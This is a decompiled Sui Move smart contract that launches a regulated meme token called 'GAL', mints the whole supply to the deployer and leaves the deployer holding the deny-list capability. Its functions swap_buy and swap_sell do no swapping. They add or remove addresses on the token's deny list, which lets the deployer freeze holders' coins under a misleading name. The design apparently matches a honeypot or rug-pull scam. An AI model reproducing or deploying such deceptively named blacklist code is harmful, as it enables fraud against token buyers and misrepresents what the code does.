module 0x94d91dc5708d6036183803399e6a1d8e41caea8ca9dded0cf3d5eca0c4b45172::gal {
    struct GAL has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: GAL, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<GAL>(arg0, 9, b"GAL", b"one unchill gal", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmSo3uhA1BouF2bhi74uUTUvFT6EsE9nH7LEw9aBPnbca7"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<GAL>(&mut v3, 690000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<GAL>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<GAL>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<GAL>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<GAL>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<GAL>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<GAL>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<GAL>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

